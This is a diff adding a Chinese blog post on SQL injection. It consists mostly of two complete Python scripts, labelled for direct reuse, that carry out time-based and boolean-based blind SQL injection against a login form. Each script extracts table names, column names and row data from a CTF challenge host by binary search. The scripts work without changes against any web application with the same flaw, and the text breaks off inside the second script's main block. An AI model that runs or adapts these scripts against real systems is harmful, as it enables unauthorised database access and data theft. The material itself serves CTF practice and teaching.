@@ -1,0 +1,902 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  
+  <title itemprop="name">SQL注入 | Potato</title>
+  
+    <link rel="shortcut icon" href="https://zhewanyiershinicheng.github.io/images/favicon.ico">
+  
+  <meta http-equiv="x-dns-prefetch-control" content="on">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+SerifMerriweather|Merriweather+Sans|Source+Code+Pro|Ubuntu:400,700|Noto+Serif+SC" media="all">
+  <link rel="dns-prefetch" href="//cdn.jsdelivr.net">
+  <link rel="stylesheet" id="saukra_css-css" href="/css/style.css" type="text/css" media="all">
+  <link rel="stylesheet" href="/css/lib.min.css" media="all">
+  <link rel="stylesheet" href="/css/font.css" media="all">
+  <link rel="stylesheet" href="/css/insight.css" media="all">
+  <link rel="stylesheet" href="/css/jquery.fancybox.min.css" media="all">
+  <link rel="stylesheet" href="/css/zoom.css" media="all">
+  <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
+<!--   <link rel="stylesheet" id="saukra_css-css" href="https://2heng.xin/wp-content/cache/autoptimize/css/autoptimize_ad42a61f4c7d4bdd9f91afcff6b5dda5.css
+" type="text/css" media="all"> -->
+  <script>
+  /*Initial Variables*/
+  var mashiro_option = new Object();
+  var mashiro_global = new Object();
+  mashiro_option.NProgressON = true;
+  /* 
+   * 邮箱信息之类的东西可以填在这里，这些js变量基本都作用于sakura-app.js
+   * 这样的设置仅是为了方便在基于PHP开发的主题中设置js变量，既然移植到了Node上，我想或许可以精简这一逻辑吧
+   */
+  mashiro_option.email_domain = "";
+  mashiro_option.email_name = "";
+  mashiro_option.cookie_version_control = "";
+  mashiro_option.qzone_autocomplete = false;
+  mashiro_option.site_name = "这就是-------Potato";
+  mashiro_option.author_name = "Potato";
+  mashiro_option.site_url = "https://github.com/zhewanyiershinicheng/";
+  mashiro_option.v_appId = "";
+  mashiro_option.v_appKey = "";
+  mashiro_option.mathjax = "0";
+  mashiro_option.qq_api_url = "https://api.mashiro.top/qqinfo/"; 
+  mashiro_option.qq_avatar_api_url = "https://api.mashiro.top/qqinfo/";
+
+  // mashiro_option.jsdelivr_css_src = "https://cdn.jsdelivr.net/gh/moezx/cdn@3.4.5/css/lib.min.css";
+  // mashiro_option.float_player_on = true;
+
+  /*End of Initial Variables*/
+  </script>
+  <script type="text/javascript">
+  var bg = "https://zhewanyiershinicheng.github.io/images/cover/(1).jpg.webp,https://zhewanyiershinicheng.github.io/images/cover/(2).jpg.webp,https://zhewanyiershinicheng.github.io/images/cover/(3).jpg.webp,https://zhewanyiershinicheng.github.io/images/cover/(4).jpg.webp,https://zhewanyiershinicheng.github.io/images/cover/(5).jpg.webp,https://zhewanyiershinicheng.github.io/images/cover/(6).jpg.webp,https://zhewanyiershinicheng.github.io/images/cover/(7).jpg.webp,https://zhewanyiershinicheng.github.io/images/cover/(8).jpg.webp".split(",");
+  var bgindex = Math.floor(Math.random()*bg.length);
+  if (!!window.ActiveXObject || "ActiveXObject" in window) { //is IE?
+    alert('朋友，IE浏览器未适配哦~');
+  }
+  </script>
+  <style type="text/css">
+  .hljs-ln{border-collapse:collapse}.hljs-ln td{padding:0}.hljs-ln-n:before{content:attr(data-line-number)}
+  </style>
+  <style type="text/css">.site-top .lower nav{display:block !important;}.author-profile i,.post-like a,.post-share .show-share,.sub-text,.we-info a,span.sitename,.post-more i:hover,#pagination a:hover,.post-content a:hover,.float-content i:hover{color:#FE9600}.feature i,.download,.navigator i:hover,.links ul li:before,.ar-time i,span.ar-circle,.object,.comment .comment-reply-link,.siren-checkbox-radio:checked + .siren-checkbox-radioInput:after{background:#FE9600}::-webkit-scrollbar-thumb{background:#FE9600}.download,.navigator i:hover,.link-title,.links ul li:hover,#pagination a:hover,.comment-respond input[type='submit']:hover{border-color:#FE9600}.entry-content a:hover,.site-info a:hover,.comment h4 a,#comments-navi a.prev,#comments-navi a.next,.comment h4 a:hover,.site-top ul li a:hover,.entry-title a:hover,#archives-temp h3,span.page-numbers.current,.sorry li a:hover,.site-title a:hover,i.iconfont.js-toggle-search.iconsearch:hover,.comment-respond input[type='submit']:hover{color:#FE9600}.comments .comments-main{display:block !important;}.comments .comments-hidden{display:none !important;}background-position:center center;background-attachment:inherit;}
+  </style>
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Potato" type="application/atom+xml">
+</head>
+
+<body class="page-template page-template-user page-template-page-analytics page-template-userpage-analytics-php page page-id-1297 chinese-font serif isWebKit">
+  <div class="scrollbar" id="bar">
+  </div>
+  <a href="#" class="cd-top faa-float animated"></a>
+  <section id="main-container">
+    <div class="headertop ">
+  <div id="banner_wave_1"></div>
+  <div id="banner_wave_2"></div>
+  <figure id="centerbg" class="centerbg">
+    <div class="focusinfo no-select">
+      <div class="header-tou">
+        <a href="https://github.com/zhewanyiershinicheng/">
+          <img src="https://zhewanyiershinicheng.github.io/images/mianhua.jpg">
+        </a>
+      </div>
+      <div class="header-info">
+        <p>这是一个关于土豆的传说......</p>
+        <div class="top-social_v2">
+          <li id="bg-pre">
+            <img class="flipx" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/next-b.svg">
+          </li>
+          
+            
+              
+                <li>
+                  <a href="http://github.com/zhewanyiershinicheng" target="_blank" class="social-github" title="github">
+                    <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/social/github.png">
+                  </a>
+                </li>
+              
+            
+          
+          <li id="bg-next">
+            <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/next-b.svg">
+          </li>
+        </div>
+      </div>
+    </div>
+  </figure>
+  <div id="video-container" style="">
+    <video style="object-fit: fill" id="bgvideo" class="video" video-name="" src="" width="auto" preload="auto">
+    </video>
+    <div id="video-btn" class="loadvideo videolive">
+    </div>
+    <div id="video-add">
+    </div>
+    <div class="video-stu">
+    </div>
+  </div>
+  <div class="headertop-down faa-float animated" onclick="headertop_down()">
+    <span>
+      <i class="fa fa-chevron-down" aria-hidden="true">
+      </i>
+    </span>
+  </div>
+</div>
+    <div id="page" class="site wrapper">
+      <header class="site-header no-select gizle sabit" role="banner">
+  <div class="site-top">
+    <div class="site-branding">
+      <span class="site-title">
+        <span class="logolink moe-mashiro">
+          <a href="/">
+            <span class="sakurasono">这就是-------</span>
+            <span class="shironeko">Potato</span>
+          </a>
+        </span>
+      </span>
+    </div>
+    <div class="searchbox search-form-submit">
+      <i class="iconfont js-toggle-search iconsearch icon-search">
+      </i>
+    </div>
+    <div id="show-nav" class="showNav mobile-fit">
+      <div class="line line1">
+      </div>
+      <div class="line line2">
+      </div>
+      <div class="line line3">
+      </div>
+    </div>
+    <div class="lower-cantiner">
+      <div class="lower">
+        <nav class="mobile-fit-control hide">
+          <ul id="menu-new" class="menu">
+            
+              <li>
+                <a href="/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
+                    首页
+                  </span>
+                </a>
+                
+              </li>
+            
+              <li>
+                <a href="/archives">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-archive faa-shake" aria-hidden="true"></i>
+                    归档
+                  </span>
+                </a>
+                
+                  <ul class="sub-menu">
+                    
+                      <li>
+                        <a href="/categories/%E6%8A%80%E6%9C%AF/">
+                          <i class="fa fa-code" aria-hidden="true"></i>
+                          技术
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/categories/%E7%94%9F%E6%B4%BB/">
+                          <i class="fa fa-file-text-o" aria-hidden="true"></i>
+                          生活
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/categories/%E8%B5%84%E6%BA%90/">
+                          <i class="fa fa-cloud-download" aria-hidden="true"></i>
+                          资源
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/categories/%E9%9A%8F%E6%83%B3/">
+                          <i class="fa fa-commenting-o" aria-hidden="true"></i>
+                          随想
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/categories/%E8%BD%AC%E8%BD%BD/">
+                          <i class="fa fa-book" aria-hidden="true"></i>
+                          转载
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/categories/%E7%A6%BB%E8%B0%B1/">
+                          <i class="fa fa-book" aria-hidden="true"></i>
+                          离谱
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/categories/%E5%8F%91%E7%94%B5/">
+                          <i class="fa fa-book" aria-hidden="true"></i>
+                          发电
+                        </a>
+                      </li>
+                    
+                  </ul>
+                
+              </li>
+            
+              <li>
+                <a href="javascript:;">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-list-ul faa-vertical" aria-hidden="true"></i>
+                    清单
+                  </span>
+                </a>
+                
+                  <ul class="sub-menu">
+                    
+                      <li>
+                        <a href="/tags/%E6%82%A6%E8%AF%BB/">
+                          <i class="fa fa-th-list faa-bounce" aria-hidden="true"></i>
+                          书单
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/bangumi/">
+                          <i class="fa fa-film faa-vertical" aria-hidden="true"></i>
+                          番组
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/music/">
+                          <i class="fa fa-headphones" aria-hidden="true"></i>
+                          歌单
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/tags/%E5%9B%BE%E9%9B%86/">
+                          <i class="fa fa-photo" aria-hidden="true"></i>
+                          图集
+                        </a>
+                      </li>
+                    
+                  </ul>
+                
+              </li>
+            
+          </ul>
+        </nav>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+<div class="pattern-center-blank"></div>
+
+<div id="content" class="site-content">
+  <div id="primary" class="content-area">
+    <main id="main" class="site-main" role="main">
+      <article id="post-1" class="post-1 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">
+        <div class="toc"></div>
+        <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
+        
+          <header class="entry-header">
+            <h1 class="entry-title">SQL注入</h1>
+            <p class="entry-census">hojun&nbsp;·&nbsp;2025-2-4&nbsp;·&nbsp;<span id="busuanzi_value_page_pv"></span>次阅读</p></p>
+
+            <hr>
+          </header>
+        
+        <div class="entry-content">
+          <h2 id="重要的玩意儿"><a href="#重要的玩意儿" class="headerlink" title="重要的玩意儿"></a>重要的玩意儿</h2><p>注入一定要注释后面的，使用<code>--</code>时注意前后要空格，要不然滚去用<code>#</code></p>
+<p><code>information_schema.tables</code>是自带的数据库</p>
+<p>其中有三个表，分别是：</p>
+<p>1.<code>schemata</code>	</p>
+<p>其中只有一个字段</p>
+<p><strong><code>schemata_name</code>	存放所有库的库名</strong></p>
+<p>2.<code>tables</code></p>
+<p>俩字段</p>
+<p><code>tables_schema</code>	存放所有库的库名</p>
+<p><strong><code>table_name</code>	存放所有表名</strong></p>
+<p>3.<code>column</code></p>
+<p>三个字段，前两个同tables（完全一样，不用改名）</p>
+<p><code>column_name</code>	存放所有的字段名</p>
+<h2 id="直接套用"><a href="#直接套用" class="headerlink" title="直接套用"></a>直接套用</h2><p>都是使用二分法来找</p>
+<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标 URL</span></span><br><span class="line">url = <span class="string">&#x27;http://challenge.ctf.rois.team:30181/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取表名</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_table_name</span>():</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    table_index = <span class="number">0</span>  <span class="comment"># 表的索引，从 0 开始</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        char_index = <span class="number">1</span>  <span class="comment"># 字符的索引，从 1 开始</span></span><br><span class="line">        current_table = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            head = <span class="number">0</span>  <span class="comment"># ASCII 起始值</span></span><br><span class="line">            tail = <span class="number">127</span>  <span class="comment"># ASCII 结束值</span></span><br><span class="line">            <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">                mid = (head + tail) // <span class="number">2</span></span><br><span class="line">                <span class="comment"># 构造时间盲注 payload</span></span><br><span class="line">                payload = &#123;</span><br><span class="line">                    <span class="string">&#x27;username&#x27;</span>: <span class="string">f&quot;&#x27; OR IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE() LIMIT <span class="subst">&#123;table_index&#125;</span>,1), <span class="subst">&#123;char_index&#125;</span>, 1)) &gt; <span class="subst">&#123;mid&#125;</span>, SLEEP(3), 0) -- &quot;</span>,</span><br><span class="line">                    <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;random_password&#x27;</span>  <span class="comment"># 密码字段可以随便填</span></span><br><span class="line">                &#125;</span><br><span class="line">                start_time = time.time()</span><br><span class="line">                r = requests.post(url, data=payload)</span><br><span class="line">                end_time = time.time()</span><br><span class="line">                elapsed_time = end_time - start_time</span><br><span class="line">                <span class="keyword">if</span> elapsed_time &gt;= <span class="number">3</span>:</span><br><span class="line">                    head = mid + <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    tail = mid</span><br><span class="line">            <span class="keyword">if</span> head == <span class="number">0</span>:  <span class="comment"># 检测到 ASCII 0 时结束当前表名</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            current_table += <span class="built_in">chr</span>(head)</span><br><span class="line">            char_index += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> current_table:  <span class="comment"># 无更多表时退出循环</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        result += current_table + <span class="string">&quot;\n&quot;</span></span><br><span class="line">        table_index += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取列名</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_column_name</span>(<span class="params">table_name</span>):</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    column_index = <span class="number">0</span>  <span class="comment"># 列的索引，从 0 开始</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        char_index = <span class="number">1</span>  <span class="comment"># 字符的索引，从 1 开始</span></span><br><span class="line">        current_column = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            head = <span class="number">0</span>  <span class="comment"># ASCII 起始值</span></span><br><span class="line">            tail = <span class="number">127</span>  <span class="comment"># ASCII 结束值</span></span><br><span class="line">            <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">                mid = (head + tail) // <span class="number">2</span></span><br><span class="line">                <span class="comment"># 构造时间盲注 payload</span></span><br><span class="line">                payload = &#123;</span><br><span class="line">                    <span class="string">&#x27;username&#x27;</span>: <span class="string">f&quot;&#x27; OR IF(ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name = &#x27;<span class="subst">&#123;table_name&#125;</span>&#x27; LIMIT <span class="subst">&#123;column_index&#125;</span>,1), <span class="subst">&#123;char_index&#125;</span>, 1)) &gt; <span class="subst">&#123;mid&#125;</span>, SLEEP(3), 0) -- &quot;</span>,</span><br><span class="line">                    <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;random_password&#x27;</span>  <span class="comment"># 密码字段可以随便填</span></span><br><span class="line">                &#125;</span><br><span class="line">                start_time = time.time()</span><br><span class="line">                r = requests.post(url, data=payload)</span><br><span class="line">                end_time = time.time()</span><br><span class="line">                elapsed_time = end_time - start_time</span><br><span class="line">                <span class="keyword">if</span> elapsed_time &gt;= <span class="number">3</span>:</span><br><span class="line">                    head = mid + <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    tail = mid</span><br><span class="line">            <span class="keyword">if</span> head == <span class="number">0</span>:  <span class="comment"># 检测到 ASCII 0 时结束当前列名</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            current_column += <span class="built_in">chr</span>(head)</span><br><span class="line">            char_index += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> current_column:  <span class="comment"># 无更多列时退出循环</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        result += current_column + <span class="string">&quot;\n&quot;</span></span><br><span class="line">        column_index += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取数据</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_data</span>(<span class="params">table_name, column_name</span>):</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    data_index = <span class="number">0</span>  <span class="comment"># 数据的索引，从 0 开始</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        char_index = <span class="number">1</span>  <span class="comment"># 字符的索引，从 1 开始</span></span><br><span class="line">        current_data = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            head = <span class="number">0</span>  <span class="comment"># ASCII 起始值</span></span><br><span class="line">            tail = <span class="number">127</span>  <span class="comment"># ASCII 结束值</span></span><br><span class="line">            <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">                mid = (head + tail) // <span class="number">2</span></span><br><span class="line">                <span class="comment"># 构造时间盲注 payload</span></span><br><span class="line">                payload = &#123;</span><br><span class="line">                    <span class="string">&#x27;username&#x27;</span>: <span class="string">f&quot;&#x27; OR IF(ASCII(SUBSTRING((SELECT <span class="subst">&#123;column_name&#125;</span> FROM <span class="subst">&#123;table_name&#125;</span> LIMIT <span class="subst">&#123;data_index&#125;</span>,1), <span class="subst">&#123;char_index&#125;</span>, 1)) &gt; <span class="subst">&#123;mid&#125;</span>, SLEEP(3), 0) -- &quot;</span>,</span><br><span class="line">                    <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;random_password&#x27;</span>  <span class="comment"># 密码字段可以随便填</span></span><br><span class="line">                &#125;</span><br><span class="line">                start_time = time.time()</span><br><span class="line">                r = requests.post(url, data=payload)</span><br><span class="line">                end_time = time.time()</span><br><span class="line">                elapsed_time = end_time - start_time</span><br><span class="line">                <span class="keyword">if</span> elapsed_time &gt;= <span class="number">3</span>:</span><br><span class="line">                    head = mid + <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    tail = mid</span><br><span class="line">            <span class="keyword">if</span> head == <span class="number">0</span>:  <span class="comment"># 检测到 ASCII 0 时结束当前数据</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            current_data += <span class="built_in">chr</span>(head)</span><br><span class="line">            char_index += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> current_data:  <span class="comment"># 无更多数据时退出循环</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        result += current_data + <span class="string">&quot;\n&quot;</span></span><br><span class="line">        data_index += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主函数</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 提取表名</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;提取表名中...&quot;</span>)</span><br><span class="line">    tables = extract_table_name()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;获取到的表名：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(tables)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 提取列名</span></span><br><span class="line">    table_name = <span class="built_in">input</span>(<span class="string">&quot;请输入要提取列名的表名：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;提取表 <span class="subst">&#123;table_name&#125;</span> 的列名中...&quot;</span>)</span><br><span class="line">    columns = extract_column_name(table_name)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;获取到的列名：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(columns)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 提取数据</span></span><br><span class="line">    column_name = <span class="built_in">input</span>(<span class="string">&quot;请输入要提取数据的列名：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;提取表 <span class="subst">&#123;table_name&#125;</span> 中列 <span class="subst">&#123;column_name&#125;</span> 的数据中...&quot;</span>)</span><br><span class="line">    data = extract_data(table_name, column_name)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;获取到的数据：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure>
+
+<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标 URL</span></span><br><span class="line">url = <span class="string">&#x27;http://challenge.ctf.rois.team:30181/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取表名</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_table_name</span>():</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    table_index = <span class="number">0</span>  <span class="comment"># 表的索引，从 0 开始</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        char_index = <span class="number">1</span>  <span class="comment"># 字符的索引，从 1 开始</span></span><br><span class="line">        current_table = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            head = <span class="number">0</span>  <span class="comment"># ASCII 起始值</span></span><br><span class="line">            tail = <span class="number">127</span>  <span class="comment"># ASCII 结束值</span></span><br><span class="line">            <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">                mid = (head + tail) // <span class="number">2</span></span><br><span class="line">                <span class="comment"># 构造注入 payload</span></span><br><span class="line">                payload = &#123;</span><br><span class="line">                    <span class="string">&#x27;username&#x27;</span>: <span class="string">f&quot;&#x27; OR IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE() LIMIT <span class="subst">&#123;table_index&#125;</span>,1), <span class="subst">&#123;char_index&#125;</span>, 1)) &gt; <span class="subst">&#123;mid&#125;</span>, 0, 1) -- &quot;</span>,</span><br><span class="line">                    <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;random_password&#x27;</span>  <span class="comment"># 密码字段可以随便填</span></span><br><span class="line">                &#125;</span><br><span class="line">                r = requests.post(url, data=payload)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;用户名或密码错误&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    head = mid + <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    tail = mid</span><br><span class="line">            <span class="keyword">if</span> head == <span class="number">0</span>:  <span class="comment"># 检测到 ASCII 0 时结束当前表名</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            current_table += <span class="built_in">chr</span>(head)</span><br><span class="line">            char_index += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> current_table:  <span class="comment"># 无更多表时退出循环</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        result += current_table + <span class="string">&quot;\n&quot;</span></span><br><span class="line">        table_index += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取列名</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_column_name</span>(<span class="params">table_name</span>):</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    column_index = <span class="number">0</span>  <span class="comment"># 列的索引，从 0 开始</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        char_index = <span class="number">1</span>  <span class="comment"># 字符的索引，从 1 开始</span></span><br><span class="line">        current_column = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            head = <span class="number">0</span>  <span class="comment"># ASCII 起始值</span></span><br><span class="line">            tail = <span class="number">127</span>  <span class="comment"># ASCII 结束值</span></span><br><span class="line">            <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">                mid = (head + tail) // <span class="number">2</span></span><br><span class="line">                <span class="comment"># 构造注入 payload</span></span><br><span class="line">                payload = &#123;</span><br><span class="line">                    <span class="string">&#x27;username&#x27;</span>: <span class="string">f&quot;&#x27; OR IF(ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name = &#x27;<span class="subst">&#123;table_name&#125;</span>&#x27; LIMIT <span class="subst">&#123;column_index&#125;</span>,1), <span class="subst">&#123;char_index&#125;</span>, 1)) &gt; <span class="subst">&#123;mid&#125;</span>, 0, 1) -- &quot;</span>,</span><br><span class="line">                    <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;random_password&#x27;</span>  <span class="comment"># 密码字段可以随便填</span></span><br><span class="line">                &#125;</span><br><span class="line">                r = requests.post(url, data=payload)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;用户名或密码错误&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    head = mid + <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    tail = mid</span><br><span class="line">            <span class="keyword">if</span> head == <span class="number">0</span>:  <span class="comment"># 检测到 ASCII 0 时结束当前列名</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            current_column += <span class="built_in">chr</span>(head)</span><br><span class="line">            char_index += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> current_column:  <span class="comment"># 无更多列时退出循环</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        result += current_column + <span class="string">&quot;\n&quot;</span></span><br><span class="line">        column_index += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取数据</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_data</span>(<span class="params">table_name, column_name</span>):</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    data_index = <span class="number">0</span>  <span class="comment"># 数据的索引，从 0 开始</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        char_index = <span class="number">1</span>  <span class="comment"># 字符的索引，从 1 开始</span></span><br><span class="line">        current_data = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            head = <span class="number">0</span>  <span class="comment"># ASCII 起始值</span></span><br><span class="line">            tail = <span class="number">127</span>  <span class="comment"># ASCII 结束值</span></span><br><span class="line">            <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">                mid = (head + tail) // <span class="number">2</span></span><br><span class="line">                <span class="comment"># 构造注入 payload</span></span><br><span class="line">                payload = &#123;</span><br><span class="line">                    <span class="string">&#x27;username&#x27;</span>: <span class="string">f&quot;&#x27; OR IF(ASCII(SUBSTRING((SELECT <span class="subst">&#123;column_name&#125;</span> FROM <span class="subst">&#123;table_name&#125;</span> LIMIT <span class="subst">&#123;data_index&#125;</span>,1), <span class="subst">&#123;char_index&#125;</span>, 1)) &gt; <span class="subst">&#123;mid&#125;</span>, 0, 1) -- &quot;</span>,</span><br><span class="line">                    <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;random_password&#x27;</span>  <span class="comment"># 密码字段可以随便填</span></span><br><span class="line">                &#125;</span><br><span class="line">                r = requests.post(url, data=payload)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;用户名或密码错误&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    head = mid + <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    tail = mid</span><br><span class="line">            <span class="keyword">if</span> head == <span class="number">0</span>:  <span class="comment"># 检测到 ASCII 0 时结束当前数据</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            current_data += <span class="built_in">chr</span>(head)</span><br><span class="line">            char_index += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> current_data:  <span class="comment"># 无更多数据时退出循环</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        result += current_data + <span class="string">&quot;\n&quot;</span></span><br><span class="line">        data_index += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主函数</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">        <span class="comment"># 